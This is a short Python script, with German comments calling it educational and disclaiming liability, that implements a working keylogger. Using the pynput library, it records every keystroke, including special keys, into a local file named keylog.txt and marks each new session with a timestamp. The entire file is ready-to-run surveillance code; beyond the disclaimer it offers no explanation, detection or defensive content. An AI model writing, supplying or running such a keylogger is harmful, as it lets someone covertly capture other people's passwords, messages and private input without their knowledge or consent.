# Dieses Skript dient ausschließlich zu Bildungszwecken.
# Die Nutzung für illegale Zwecke ist verboten.
# Der Autor übernimmt keine Haftung für Schäden oder Missbrauch.
from pynput import keyboard
from datetime import datetime

LOG_FILE = "keylog.txt"

def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(LOG_FILE, "a") as f:
            f.write(f"[{key.name}]")

def main():
    with open(LOG_FILE, "a") as f:
        f.write(f"\n\n--- Neue Sitzung gestartet am {datetime.now()} ---\n")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()